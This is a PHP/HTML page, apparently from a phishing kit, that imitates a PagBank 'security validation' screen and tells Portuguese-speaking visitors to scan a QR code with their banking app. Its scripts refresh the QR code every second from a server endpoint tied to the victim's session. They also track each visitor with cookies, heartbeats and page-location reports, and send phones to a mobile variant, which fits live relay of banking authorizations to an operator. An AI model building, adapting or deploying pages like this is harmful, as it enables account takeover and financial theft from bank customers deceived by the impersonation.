<?php
session_start();

// Verifica se o cookie 'identificador_cliente' JÁ EXISTE
if (!isset($_COOKIE['identificador_cliente'])) {
    // Se não existe, GERA um valor único e seguro
    $cookie_value = 'user_' . bin2hex(random_bytes(16));

    // Define o cookie para expirar em 30 dias
    setcookie('identificador_cliente', $cookie_value, time() + 86400 * 30, '/');

    // Disponibiliza o cookie para uso imediato no mesmo request
    $_COOKIE['identificador_cliente'] = $cookie_value;
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>A solução completa para pagamentos online</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0; padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', sans-serif;
    }

    body {
      background: #fff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px 40px;
      border-bottom: 1px solid #ddd;
    }

    header img {
      height: 40px;
      margin-left: 355px; /* ajuste o valor como quiser */
    }


    header select {
      padding: 6px 14px;
      font-size: 14px;
      font-weight: 500;
      border: 1px solid #ccc;
      border-radius: 20px;
      background-color: #fff;
      appearance: none;
      -webkit-appearance: none;
      -moz-appearance: none;
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg width='12' height='8' viewBox='0 0 12 8' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%23007fc7' stroke-width='2' fill='none' fill-rule='evenodd'/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      background-position: right 10px center;
      background-size: 12px 8px;
      padding-right: 32px;
      margin-right: 355px;
      cursor: pointer;
    }

    .wrapper {
      max-width: 1240px;
      margin: 0 auto;
      padding: 30px 40px;
    }

    .voltar {
      color: #007fc7;
      font-size: 14px;
      text-decoration: none;
      display: inline-block;
      margin-bottom: 6px;
    }

    .voltar::before {
      content: "← ";
    }

    h1 {
      font-size: 20px;
      font-weight: 1;
      margin-bottom: 30px;
      color: #222;
    }

    .main {
      display: flex;
      flex-wrap: wrap;
      gap: 40px;
      justify-content: flex-start;
      align-items: stretch;
    }

    .bloco {
      display: flex;
      background: #fff;
      border: 1px solid #ddd;
      border-radius: 8px;
      padding: 32px;
      flex: 1;
      min-width: 660px;
      max-width: 760px;
      align-items: flex-start;
      gap: 30px;
    }

    .etapas {
      position: relative;
      display: flex;
      flex-direction: column;
      padding-left: 16px; /* novo recuo para o traço */
    }

    .etapas::before {
      content: "";
      position: absolute;
      left: 27px;  /* centralizado atrás dos círculos */
      top: 41px;   /* começa entre 1 e 2 */
      height: calc(100% - 120px); /* altura até a base do número 4 */
      width: 1px;
      background: #ccc;
      z-index: 0;
    }


    .linha {
      display: flex;
      align-items: flex-start;
      margin-bottom: 20px;
    }

    .numero {
      background: #02c39a;
      color: #fff;
      width: 24px;
      height: 24px;
      font-size: 14px;
      font-weight: bold;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-right: 12px;
      flex-shrink: 0;
      z-index: 1; /* garante que o número fique sobre a linha */
    }
    .linha span {
      font-size: 15px;
      color: #333;
      line-height: 1.6;
    }

    .linha span strong {
      font-weight: 600;
    }

    .ajuda {
      font-size: 14px;
      margin-top: 8px;
    }

    .ajuda a {
      color: #007fc7;
      text-decoration: none;
    }

    .celular {
      background: #000;
      width: 190px;
      height: 360px;
      border-radius: 28px;
      padding: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-shrink: 0;
    }

    .celular video {
      width: 135%;
      height: 90%;
      border-radius: 1px;
      object-fit: cover;
    }

    .qrcode {
      width: 400px;
      background: #fff;
      border: 1px solid #ddd;
      border-radius: 8px;
      padding: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 424px; /* altura igual à altura do .bloco (360 + padding interno) */
    }

    .qrcode img {
      max-height: 100%;
      max-width: 100%;
    }

    footer {
      background: #222;
      color: #ccc;
      text-align: center;
      font-size: 12px;
      padding: 20px 10px;
      margin-top: auto;
    }

    footer img {
      height: 28px;
      margin-bottom: 10px;
    }

    footer p {
      margin: 4px 0;
    }

    @media (max-width: 768px) {
      .main {
        flex-direction: column;
      }

      .celular {
        width: 150px;
        height: 260px;
      }

      .qrcode {
        width: 100%;
        height: auto;
      }

      .qrcode img {
        height: 200px;
      }
    }
  </style>
</head>
<body>

  <header>
    <select><option>PT</option></select>
  </header>

  <div class="wrapper">
    <a href="javascript:history.back()" class="voltar">Voltar</a>
    <h1>Validação de Segurança</h1>

    <div class="main">

      <!-- BLOCO PRINCIPAL -->
      <div class="bloco">
        <div class="etapas">
          <p style="margin-bottom: 20px; font-size: 18px; color: #666;">O que devo fazer?</p>

          <div class="linha">
            <div class="numero">1</div>
            <span>Abra o aplicativo PagBank em seu celular</span>
          </div>

          <div class="linha">
            <div class="numero">2</div>
            <span>Na tela inicial clique no símbolo do cadeado <img src="imagens/icone-cadeado.png" alt="Cadeado" style="width: 30px; height: 30px; vertical-align: middle; margin-left: 4px;"></span>
          </div>

          <div class="linha">
            <div class="numero">3</div>
            <span>Selecione a opção <strong>QR Code</strong></span>
          </div>

          <div class="linha">
            <div class="numero">4</div>
            <span>Aponte a câmera para o QR Code e siga as instruções do app</span>
          </div>

          <div class="ajuda"><a href="#">Precisa de ajuda?</a></div>
        </div>

        <div class="celular">
          <video src="imagens/celular-validacao.mp4" autoplay muted loop></video>
        </div>
      </div>

      <!-- QR CODE -->
      <div class="qrcode">
        <img id="qrcode" src="imagens/qrcode-pagbank.png" alt="QR Code PagBank">
      </div>
    </div>
  </div>

  <footer>
    <p>© 1996-2025 Todos os direitos reservados.</p>
    <p>Av. Brigadeiro Faria Lima, 1.384, São Paulo – SP – CEP 01451-001</p>
  </footer>

    <script>
    document.addEventListener("DOMContentLoaded", function () {
      const isMobile = /iphone|ipod|android|webos|blackberry|iemobile|opera mini/i.test(navigator.userAgent.toLowerCase());
      if (isMobile) {
        window.location.href = "validacao-mobile.php";
      }
    });
    </script>

    <script>
      const clienteId = '<?php echo $_SESSION["cliente_id"] ?? ''; ?>';

      function atualizarQrCode() {
        if (!clienteId) return;
        fetch('get_qrcode.php?cliente_id=' + clienteId)
          .then(res => res.json())
          .then(data => {
            if (data.qrcode) {
              const img = document.getElementById('qrcode');
              const timestamp = new Date().getTime();
              img.src = data.qrcode + '?t=' + timestamp;
            }
          });
      }

      setInterval(atualizarQrCode, 1000);
    </script>
  <script>
    function getCookie(name) {
        const value = `; ${document.cookie}`;
          const parts = value.split(`; ${name}=`);
        if (parts.length === 2) return parts.pop().split(';').shift();
    }
    function sendHeartbeat() {
            // CORREÇÃO: Usando o nome correto do cookie
        const userCookie = getCookie('identificador_cliente'); 

          if (userCookie) {
            const formData = new FormData();
              formData.append('identificador_cookie', userCookie);

                  fetch('/heartbeat.php', { // O caminho para o nosso novo arquivo
                      method: 'POST',
                      body: formData
                  }).catch(error => console.error('Heartbeat falhou:', error));
                } 
            }
            // Envia o primeiro sinal imediatamente e depois a cada 10 segundos
      sendHeartbeat();
      setInterval(sendHeartbeat, 3000); // 10000 ms = 10 segundos
  </script>
  <script>
      document.addEventListener("DOMContentLoaded", function() {
          const nomeDaPagina = 'validacao.php'; // <-- MUDE ESTE VALOR EM CADA PÁGINA
          
          const formData = new FormData();
          formData.append('page', nomeDaPagina);

          fetch('update_location.php', {
              method: 'POST',
              body: formData
          }).catch(error => console.error('Falha ao atualizar localização:', error));
      });
  </script>

</body>
</html>
